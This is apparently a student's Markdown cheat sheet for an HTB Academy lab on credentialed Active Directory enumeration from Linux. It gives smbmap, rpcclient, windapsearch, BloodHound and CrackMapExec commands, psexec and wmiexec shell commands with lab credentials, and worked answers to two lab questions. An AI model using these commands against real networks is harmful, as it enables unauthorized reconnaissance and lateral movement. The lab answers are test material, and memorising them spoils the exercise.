```markdown
# 🛰️ Recursive Directory Listing
```bash
# Recursive listing of directories in specific share
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

---

## 📞 rpcclient

### 🔍 **User Enumeration**
```bash
# Authenticated connection
rpcclient -U "INLANEFREIGHT.LOCAL\forend%Klmcargo2" 172.16.5.5

# NULL session (if allowed)
rpcclient -U "" -N 172.16.5.5
```

### 📝 **RID and SID Understanding**
```bash
# List all domain users with RIDs
rpcclient $> enumdomusers

# Example output:
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]

# Query specific user by RID (hex)
rpcclient $> queryuser 0x457
```

### 📊 **RID and SID Examples**
```bash
# RID (Relative Identifier) Examples:
# Administrator: RID 0x1f4 (500 decimal) - Always the same
# Domain Users: RID 0x201 (513 decimal) - Standard group
# Domain Admins: RID 0x200 (512 decimal) - Admin group

# Full SID format: S-1-5-21-<domain-identifier>-<RID>
# Example: S-1-5-21-3842939050-3880317879-2865463114-1111
```

---

## 🐍 Impacket Toolkit

### 🔥 **psexec.py**
```bash
# Establish SYSTEM-level shell via service creation
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

### ⚡ **wmiexec.py**
```bash
# Semi-interactive shell via WMI
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

---

## 🔍 Windapsearch

### 📝 **Domain Admins Enumeration**
```bash
# Enumerate Domain Admins group members
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

### 🎯 **Privileged Users (Nested Groups)**
```bash
# Find all privileged users via recursive group membership
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

---

## 🩸 BloodHound.py

### 🔥 **Data Collection**
```bash
# Collect all available data
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### 📁 **Output Files**
```bash
# Generated JSON files
20220307163102_computers.json
20220307163102_domains.json  
20220307163102_groups.json
20220307163102_users.json

# Create zip for BloodHound GUI upload
zip -r ilfreight_bh.zip *.json
```

---

## 🎯 HTB Academy Lab Solutions

### 🔍 **Question 1: "What AD User has a RID equal to Decimal 1170?"**

**Solution Process:**
```bash
# Step 1: Convert decimal 1170 to hex
python3 -c "print(hex(1170))"
# Output: 0x492

# Step 2: Use rpcclient to query the RID
rpcclient -U "INLANEFREIGHT.LOCAL\forend%Klmcargo2" 172.16.5.5
rpcclient $> queryuser 0x492

# Step 3: Identify the username from output
# Alternative: enumerate all users and filter
rpcclient $> enumdomusers | grep 0x492
```

### 👥 **Question 2: "What is the membercount of the 'Interns' group?"**

**Solution Process:**
```bash
# Method 1: Using CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep -i interns

# Method 2: Using rpcclient
rpcclient -U "INLANEFREIGHT.LOCAL\forend%Klmcargo2" 172.16.5.5
rpcclient $> enumdomgroups | grep -i interns
# Note the RID, then:
rpcclient $> querygroup [RID_OF_INTERNS_GROUP]
```

---

## ⚡ Quick Reference Commands

### 🔧 **Essential One-Liners**
```bash
# Quick domain user count
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users | grep -c "INLANEFREIGHT.LOCAL"

# Find Domain Admin count
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep "Domain Admins" | awk '{print $NF}'

# RID to hex conversion
python3 -c "print(hex(1170))"  # Converts decimal to hex for rpcclient
```

---

## 🔑 Key Takeaways

### ✅ **Critical Success Factors**
- **Valid credentials are essential** - Even low-privilege domain user accounts unlock extensive enumeration.
- **Multiple tools provide different perspectives** - Use complementary tools for comprehensive coverage.
- **Save all output to files** - Essential for analysis, correlation, and reporting.
- **Focus on privileged groups** - Domain Admins, Enterprise Admins, Backup Operators, etc.

### 🎯 **Strategic Priorities**
1. **User enumeration** - Identify high-value targets and service accounts.
2. **Group membership analysis** - Understand privilege relationships.
3. **Share exploration** - Find sensitive data and configuration files.
4. **Session hunting** - Locate privileged users on accessible systems.
5. **Attack path visualization** - Use BloodHound for strategic planning.

---

*Credentialed enumeration from Linux provides powerful capabilities for AD assessment - with valid credentials, even low-privilege accounts can reveal extensive domain intelligence for strategic attack planning.*
```